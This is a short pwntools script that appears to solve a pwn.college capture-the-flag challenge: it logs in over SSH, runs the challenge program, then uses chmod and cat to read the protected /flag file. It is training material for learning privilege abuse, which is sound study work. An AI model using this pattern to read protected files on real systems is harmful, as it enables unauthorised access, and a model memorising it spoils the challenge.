#!/usr/bin/python3

from pwn import *

s = ssh(host="dojo.pwn.college",user="hacker",keyfile="../../key")

s.process("/challenge/run")

print("\033[38;5;80mChanging permission")

s.process(["chmod", "600", "/flag"])

data = s.process(["cat","/flag"])

data.interactive()

